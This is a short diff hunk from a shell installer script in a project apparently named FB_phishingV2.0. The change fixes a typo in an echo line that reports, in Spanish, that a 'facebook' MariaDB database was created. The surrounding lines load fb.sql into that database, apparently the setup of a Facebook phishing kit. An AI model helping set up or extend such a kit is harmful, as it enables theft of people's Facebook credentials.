@@ -67,7 +67,7 @@ cd ~/FB_phishingV2.0
 cp -r fb.sql $PREFIX/bin
 mariadb -u root -e "create database facebook"
 mariadb -u root facebook < fb.sql
-aecho -e "\e[1;36m LA DATABASE FACEBBOK SE CREO CON EXITO"                                                sleep 1.5
+echo -e "\e[1;36m LA DATABASE FACEBBOK SE CREO CON EXITO"                                                sleep 1.5
 clear                                                banner
 seleccion
 	fi
